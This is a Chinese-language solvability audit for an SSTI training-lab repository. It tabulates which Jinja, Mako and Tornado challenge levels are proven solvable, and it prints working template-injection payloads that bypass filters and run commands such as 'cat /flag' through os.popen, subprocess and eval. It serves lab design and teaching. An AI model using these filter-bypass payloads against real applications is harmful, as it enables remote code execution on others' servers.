# 关卡可解性审计（Solvability Audit）

> **这份文档回答一个具体问题：每一关都有解吗？**
> 它不复述题解，只给出「已证明可解 / 未找到解」的实测矩阵，以及未解关卡的成因分析。
>
> 数据来源：`tests/audit_solvability.py`（对每一关跑一批候选载荷，逐条实打）。
> 最近一次全量运行：见文末「复现方法」。

---

## 1. 结论速览

| 靶场 | 关卡数 | 已证明可解 | 未找到解 | 未解关卡 |
|------|--------|-----------|----------|----------|
| 02-jinja-chain | 13 | **12** | 1 | id 12 (L13) |
| 03-mako-chain | 13 | **13** | 0 | — |
| 04-tornado-chain | 13 | **13** | 0 | —（id 1 已由设计缺陷改为可解关卡） |
| 09-bottle-chain | 13 | **13** | 0 | — |
| 01-jinja-waf-fenjing | 1 | 1 | 0 | — |
| 05-jinja-sandbox | 4 | 4 | 0 | — |
| 06-blind-ssti | 4 | 4 | 0 | — |
| 07-flask-memshell | 5（攻击链台阶） | 5 | 0 | — |
| 08-freemarker-memshell | 4（攻击链台阶） | 4 | 0 | — |

**链式靶场合计：51/52 关已由实跑证明可解；仅 1 关（02 id 12）保留为无已知解的作者挑战关。**

> 注意口径差异：01/05/06/07/08/09 的「已证明可解」指**拿到了 `/flag`**；
> 02/03/04 的链式关卡同样以「拿到 flag」为准（盲关看 god 模式的 `raw_output`）。
> 「未找到解」是**技术上未能构造出可利用载荷**，不等于数学上证明了无解 ——
> 但作为出题方，我们不应把「可能有解」当成「有解」来交付。

---

## 2. 历史：上一轮审计的 9 个「未找到解」是怎么被解掉的

上一版审计报告 9 关未找到解（02 id 11/12、03 id 10/11/12、04 id 1/10/11/12）。
本轮逐关重审，其中 8 关找到了真实解，1 关确认保留为挑战关，1 关属于设计缺陷直接修掉。

### 2.1 `04-tornado-chain` id 1（原 L2 拦截 `{{`）——设计缺陷，已修复

Tornado 模板**只有 `{{ ... }}` 一种输出构造**；拦掉 `{{` 等于把回显通道整个拿掉。
本仓库已按本文档旧版 2.1 节的**方案 A'** 的思路把该关的过滤目标从 `{{` 改为
**子串 `open`**（`docs/SOLVABILITY.md` 旧版建议拦 `import`，但 `__import__` 含
`import` 子串同样会被拦，原文档的建议注记有误，一并修正）：

```python
waf=WafSpec(substrings=("open",), ignore_case=False,
            note="命中子串 `open` 即整段替换为 `WAF`（os.popen 含 open，一并被拦）。")
```

参考解（换一条不含 `open` 的 gadget）：

```text
{{__import__('subprocess').getoutput('cat /flag')}}
{% import subprocess %}{{subprocess.getoutput('cat /flag')}}
```

教学点：第一条过滤封掉「最顺手的那个函数」时，换 gadget 而不是换语法面。

### 2.2 `02-jinja-chain` id 11（L12 强字符集）——`request` 与数字都没被禁

L12 禁 `_ . 0-9 \ ' " [ ]`，看似把「造下划线」的两条路都堵死了
（`dict(__globals__=1)` 源码含 `_`；`chr(95)` 需要数字）。
但对比 L11 的黑名单会发现一个缺口：**`request` 没有被禁**。
于是属性名全部从 query 带入，载荷里一个 `_`、一个引号、一个数字都不出现：

```text
{%set r=request|attr(dict(args=true)|first)|attr(dict(get=true)|first)%}
{{lipsum|attr(r(dict(a=true)|first))|attr(r(dict(b=true)|first))(r(dict(c=true)|first))|attr(r(dict(d=true)|first))(r(dict(e=true)|first))|attr(r(dict(f=true)|first))()}}
```

query：`a=__globals__&b=get&c=os&d=popen&d=…&e=cat%20%2Fflag&f=read`
（即 `a=__globals__ b=get c=os d=popen e=cat /flag f=read`）。

要点：`dict(关键字=true)|first` 在**无引号、无数字**的条件下造出短字符串；
`r` 是绑定好的 `request.args.get`，六个属性名/命令全部来自请求。

### 2.3 `03-mako-chain` id 10 / 11 / 12 ——「原生 Python」两条造串通道

Mako 的 `${}` 里是原生 Python，这给了它两条 Jinja 没有的通道：

* **`min(dict(kw=1))`** —— 对 dict 求最小值返回最小的**键**，键名即字符串，
  不需要引号；配合 `str(bytes((99,97,…)), 编码)` 可以无引号、无加号、无点号地
  造出任意字节串（编码名 `utf8` 本身也是从键名白嫖的）。
* **代码块 `from x import y`** —— `<% %>` / `<%! %>` 里的 import 语句是纯 Python
  语法，子串黑名单拦不到它（`subprocess` / `getoutput` 不在表里）。

| 关卡 | 过滤 | 参考解 |
|------|------|--------|
| id 10（L11） | `' " + . [ ]` + `request` | `${getattr(getattr(__import__(min(dict(os=1))),min(dict(popen=1)))(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}` |
| id 11（L12） | 再禁 `_`、数字 | `${getattr(open(chr((True+True+True+True)*(True+…×12)-True)+min(dict(flag=True))),min(dict(read=True)))()}` —— `True` 参与算术凑 `chr(47)`（`/`），`dict(flag=True)` 白嫖文件名 |
| id 12（L13） | 再禁 `+` + 关键字表 | `<% from subprocess import getoutput %>${getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}` —— 数字仍可用，`getattr`（含 `attr`）被禁但 `from-import` 语句不在表里 |

### 2.4 `04-tornado-chain` id 10 / 11 / 12 ——同样的两条通道，Tornado 语法

Tornado 模板里 Python 内置函数同样直接可用（实测），且 `{% from x import y %}`
语句是 Tornado 原生支持的：

| 关卡 | 过滤 | 参考解 |
|------|------|--------|
| id 10（L11） | `' " + . [ ]` + `request`（`_` 与数字可用） | `{% import os %}{{getattr(getattr(os,min(dict(popen=1)))(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1)))),min(dict(read=1)))()}}` |
| id 11（L12） | 再禁 `_`、数字（`+` 未禁） | `{% import os %}{{getattr(open(getattr(os,min(dict(sep=True)))+min(dict(flag=True))),min(dict(read=True)))()}}` —— `os.sep` 就是 `/` |
| id 12（L13） | 符号 + 关键字表（数字可用；`getattr` 含 `attr` 被禁） | `{% from subprocess import getoutput %}{{getoutput(str(bytes((99,97,116,32,47,102,108,97,103)),min(dict(utf8=1))))}}`；兜底：`{{eval(str(bytes((…)),min(dict(utf8=1))))}}`（eval 接受字符串源码，字节串内容对 WAF 不可见） |

### 2.5 `02-jinja-chain` id 12（L13 扩展关键字）——保留为作者挑战关

在 L12 的基础上再禁 `request/class/init/arg/config/app/self` 与 `+`。
`attr` 在子串表里 ⇒ `|attr`、`getattr`、`map(attribute=…)`、`selectattr`…
Jinja **全部属性访问原语**写不出来；加上点号与方括号被禁，
已知的每条 gadget 链都需要至少一次属性访问。参考项目
`ProbiusOfficial/ssti-lab` 自己也在文档里承认这一组「默认 Python 下无短解」。

处理：保留难度上限，题面如实标注「目前没有已证明的解」，避免选手空耗。
若某教学场次需要人人可过，可按下表放宽一条约束即可（任选其一）：

| 放宽 | 立即出现的短解 |
|------|----------------|
| 允许 `request` | §2.2 的 query 传参解直接生效 |
| 允许 `attr` 子串 | `|attr` 复活，`dict(kw=…)|first` 造串成立 |
| 允许 `.` | 点号属性访问直接成立 |

---

## 3. 建议（历史版）：怎么处理「无已知解」的关卡

| 方案 | 做法 | 适用 |
|------|------|------|
| **A. 如实标注（02 id 12 采用）** | 题面/文档写明「无已知短解」，避免选手空耗；保留难度上限 | 想保留「作者挑战关」的靶场 |
| **B. 定向放宽** | 每关只松开一条约束，使短解存在（见 §2.5 的表） | 教学场次、需要人人可过 |
| **C. 改成开放题** | 保留过滤，但把目标从「拿 flag」改成「证明存在性」（例如只要能拿到 `uid=` 即算过） | 已经部分可达的关卡 |

---

## 4. 复现方法

```bash
# 全部链式靶场（02/03/04/09），逐关跑候选载荷并打印矩阵
python tests/audit_solvability.py

# 只审计某一个；保留容器便于手工深挖
python tests/audit_solvability.py 02 --keep

# 与「主干链条」的回归验证互补：前者问「每关都有解吗」，
# 后者问「我知道的那些 payload 还能用吗」
python scripts/verify_labs.py
python tests/verify_memshell.py     # 需在容器内跑，见该文件头部
python tests/verify_blind.py        # 同上
```

退出码：`0` 表示全部关卡都有解；`1` 表示存在未找到解的关卡（本仓库当前为 1，
即 02 id 12 —— 这是刻意保留的挑战关，见 §2.5）。

---

## 5. 这份审计本身的价值

`ssti_core` 的关卡难度完全由 `WafSpec` 决定，而 `WafSpec` 是**声明式**的 ——
这意味着「难度」是个可以被程序化检验的属性，而不是凭感觉。

两轮审计一共揪出了 7 处**假阴性/假阳性**，全部是探针写错导致的，而不是关卡问题：

1. 盲关（`echo_mode="bool"`）在 god 模式下 `raw_output` 就是真实输出 ——
   最初只把 flag 用在 `if` 条件里，永远不会命中；
2. Mako/Tornado 的盲关同理；
3. Jinja L7 用 `|attr` 访问 dict 不成立（`.` 会回退 `__getitem__`，`|attr` 不会）；
4. Tornado L8 不需要 `escape.__globals__` —— 模板直接拿得到 Python 内置函数，
   绕那一圈反而会撞上 `global`/`attr`/`open` 三个被禁子串；
5. 旧版 Tornado L2 的探针里自己写了 `{{`；
6. 旧版 Mako L11 的探针里带了引号；
7. 旧版 03/04 id 10–12 的探针沿用「已知路走不通」的假设，只放了少量凑数候选 ——
   换上「`min(dict(kw))` 取键名 + `str(bytes(…), 编码)` 造串」两条通用通道后，
   同一批关卡全部出现真实解。**探针的想象力上限就是审计的上限。**

教训很直接：**审计脚本自己也需要被审计** —— 所以本文档记录的是「实跑矩阵」，
并且每条结论都给了成因与可复现载荷，而不是一句「很难，跳过」。
